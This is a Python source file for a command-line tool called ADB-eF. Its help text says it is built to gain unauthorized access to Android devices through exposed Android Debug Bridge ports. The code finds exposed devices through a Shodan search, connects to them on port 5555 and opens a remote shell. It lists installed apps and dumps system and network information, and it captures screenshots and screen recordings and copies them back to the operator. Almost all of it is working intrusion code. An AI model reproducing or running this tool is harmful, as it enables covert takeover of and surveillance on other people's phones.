from extra import banners
from subprocess import check_output
import os
import socket
import time
import subprocess
from colorama import Fore
import shodan

class colors:
    blue = Fore.LIGHTBLUE_EX
    cyan = Fore.LIGHTCYAN_EX
    green = Fore.LIGHTGREEN_EX
    magenta = Fore.LIGHTMAGENTA_EX
    red = Fore.LIGHTRED_EX
    reset = Fore.LIGHTWHITE_EX
    yellow = Fore.LIGHTYELLOW_EX

trash = open(os.devnull, 'w')

c = colors()

host = c.green + socket.gethostname()


def shodan_search_in():
    SHODAN_API_KEY = input('{}adb-ef{}@shodan_search(Your Shodan API Key): '.format(c.red,c.reset))
    api = shodan.Shodan(SHODAN_API_KEY)

    try:
        # Search Shodan
        results = api.search('android debug bridge')
            # Show the results
        print('\nResults found: {}'.format(results['total']))
        for result in results['matches']:
            print('[+] IP: {}:{}'.format(result['ip_str'],result['port']))

    except shodan.APIError as e:
        print('Error: {}'.format(e))


def help_commands():
    print('''
    [+] ADB-eF is an interface for remotely operating android devices that seeks to gain unauthorized access based on the Android interface debug bridge

    [+] Commands:
            modules: Available modules
            use {module}: use a module available
            connect: remote connection
            help: See tool help
            exit: Exit the tool
            clear: Clean Screen
            banner: a new banner returns
            version: current version of the tool
    ''')

def help_modules():
    print('''
    Modules:
            shodan_search: Search in shodan for potentially vulnerable devices
    ''')

def available_modules():
    modules = ['shodan_search','scan_for_local_hosts']
    return modules

def commands():
    print('''
    help:         see help
    clear:        clear screen
    battery:      check the battery status
    applications: list the applications installed on the device
    netstat:      check the status of network connections
    shell:        try to get a remote shell on the system
    inet: 	      Displays information on network interfaces
    sysinfo:      show all system information
    screenshot:   try to take a screenshot of the device
    record:       try to record the device screen
    disconnect:   disconnect device
    exit:         Exit the tool
    ''')

def start_server():
    p = subprocess.call(['adb','start-server'], stdout=trash, stderr=subprocess.STDOUT)
    return p

def kill_server():
    p = subprocess.call(['adb','kill-server'], stdout=trash, stderr=subprocess.STDOUT)

def main():

    c = colors()

    a = os.popen('which adb').read().strip()
    time.sleep(1)
    if a != "":
        print('{}[+]{} ADB is installed\n'.format(c.green, c.reset))
        time.sleep(1)
        print('{}[+]{} Starting server'.format(c.green, c.reset))
        v = start_server()

        if v == 0:

            time.sleep(1)

            print('{}[+]{} Server started'.format(c.green, c.reset))
            time.sleep(1)
            banner = banners.return_banner()
            print(banner)

            while True:
                command = input('{}{}@{}adb-Ef${} '.format(c.reset, host, c.cyan, c.reset))
                if command.lower() == 'help':
                    help_commands()
                elif command.lower() == 'banner':
                    banner = banners.return_banner()
                    print(banner)
                elif command.lower() == 'exit':
                    print('\n{}[!] {}Exiting...'.format(c.red, c.reset))
                    kill_server()
                    exit(1)
                elif command.lower() == 'clear':
                    os.system('clear')
                elif command.lower() == 'version':
                    print('{}[+] {}The version of the tool is: {}0.1'.format(c.green, c.reset, c.green))
                elif command.lower() == 'modules':
                    help_modules()
                elif 'connect' in command.lower():
                    command = command.lower().split(' ')

                    if len(command) != 2:
                        print('{}[x] {}Use: connect ip\texample: connect 127.0.0.1'.format(c.red, c.reset))
                    else:
                        if command[0] == 'connect' and '.' in command[1]:
                            print('{}[+] {}Connecting to {}..'.format(c.cyan, c.reset, command[1]))

                            z = subprocess.call(['adb','connect',command[1]+':5555'],stdout=trash, stderr=subprocess.STDOUT)
                            time.sleep(2)
                            z = subprocess.call(['adb','connect', command[1]+':5555'],stdout=trash,stderr=subprocess.STDOUT)
                            res = os.popen('adb devices | grep 5555').read()

                            if ':5555' in res.lower() and 'offline' not in res.lower():
                                while True:
                                    command_shell = str(input('{}parro@{}adb-ef{}({}{}{}): '.format(c.cyan,c.green,c.reset,c.red,command[1],c.reset)))
                                    if command_shell == 'help':
                                        commands()
                                    elif command_shell.lower() == 'clear':
                                        os.system('clear')
                                    elif command_shell.lower() == 'battery':
                                        res = os.popen('adb shell dumpsys battery').read()
                                        print(res)
                                    elif command_shell.lower() == 'applications':
                                        res = os.popen('adb shell pm list packages').read()
                                        print(res)
                                    elif command_shell.lower() == 'netstat':
                                        res = os.popen('adb shell netstat').read()
                                        print(res)
                                    elif command_shell.lower() == 'shell':
                                        os.system('adb shell')
                                    elif command_shell.lower() == 'inet':
                                        res = os.popen('adb shell ip address show').read()
                                        print(res)
                                    elif command_shell.lower() == 'sysinfo':
                                        res = os.popen('adb shell dumpsys').read()
                                        print(res)
                                    elif command_shell.lower() == 'screenshot':
                                        res = os.popen('adb shell screencap -p /sdcard/screenshot.png').read()
                                        print(res)
                                        os.system('adb pull sdcard/screenshot.png {}'.format(str(os.getcwd()+'/')))
                                        
                                        res = os.popen('adb shell rm /sdcard/screenshot.png').read()
                                        print(res)

                                        if os.path.exists(str(os.getcwd()+'/'+'screenshot.png')):
                                            print('{}[+] {}Saved on: {}'.format(c.cyan,c.reset, os.getcwd()+'/'))
                                        else:
                                            pass
                                    elif command_shell.lower() == 'record':
                                        print('{}[!] {}Press CTRLL + C to stop recording'.format(c.cyan, c.reset))
                                        os.system('adb shell screenrecord /sdcard/screen.mp4 --verbose')
                                        print('{}[!] {}Trying to download the video'.format(c.green, c.reset))
                                        os.system('adb pull /sdcard/screen.mp4 {}'.format(str(os.getcwd()+'/')))
                                        os.system('adb shell rm /sdcard/screen.mp4')

                                        if os.path.exists(os.getcwd()+'/screen.mp4'):
                                            print("{}[+] {}File saved in: {}".format(c.green, c.reset, os.getcwd()+'/screen.mp4'))
                                        else:
                                            print('{}[x] {}Could not download file'.format(c.red, c.reset))
                                    elif command_shell.lower() == 'disconnect':
                                        print('{}[+] {}Disconnecting ...'.format(c.yellow, c.reset))
                                        os.system('adb disconnect')
                                        time.sleep(1)
                                        main()
                                    elif command_shell.lower() == 'exit':
                                        print('\n{}[!] {}Exiting...'.format(c.red, c.reset))
                                        kill_server()
                                        exit(1)
                                    else:
                                        if command_shell.lower() != "":
                                            print('{}[x] {}{} Not recognized as a tool command'.format(c.red,c.reset,command_shell.lower()))
                                        else:
                                            pass
                            else:
                                print('{}[x] {}Could not create shell in: {}'.format(c.red, c.reset, command[1]))


                        else:
                            print('{}[x] {}Use: connect ip'.format(c.red, c.reset))
                elif 'use' in command.lower():
                    try:
                        modules = available_modules()
                        module_use = command.lower().split(" ")[1]
                        if module_use in modules:
                            shodan_search_in()
                        else:
                            print('{}[x] {}Module not found'.format(c.red, c.reset))
                    except IndexError:
                        print('{}[x] {}Error. Use command: use module'.format(c.red, c.reset))
                else:
                    if command.lower() != "":
                        print('{}[x] {}{} Not recognized as a tool command'.format(c.red,c.reset,command.lower()))
                    else:
                        pass
        else:
            print("{}[x]{} Could not start the server".format(c.red, c.reset))
    else:
        print('{}[x] {}Please install adb:\n{}sudo apt install adb'.format(c.red, c.reset, c.cyan))
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print('\n{}[!] {}Exiting...'.format(c.red, c.reset))
        kill_server()
        exit(1)
